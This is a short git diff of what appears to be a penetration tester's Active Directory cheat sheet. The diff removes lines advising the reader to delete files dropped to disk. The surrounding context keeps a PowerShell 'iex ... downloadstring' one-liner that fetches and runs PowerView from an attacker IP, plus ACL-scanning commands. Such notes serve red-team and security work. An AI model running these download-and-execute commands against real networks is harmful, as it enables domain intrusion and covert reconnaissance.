@@ -24,8 +24,6 @@ cd to a discrete, writable directory (c:\users\<user>\appdata\local).
 iex (new-object net.webclient).downloadstring('http://<attacker IP>/PowerView.ps1')
 
 Invoke-ACLScanner | Export-PowerViewCSV acls.csv
-
-Download the files as needed, then delete files dropped to disk.
 =========================================================================================================================
 
 # ADACLScanner
@@ -40,8 +38,6 @@ iex (new-object net.webclient).downloadfile('http://<target IP>/ADACLScan.ps1', 
 .\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML
 
 File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
-
-Download the files as needed, then delete files dropped to disk.
 =========================================================================================================================
 
 # Show Domain Controllers (DC)
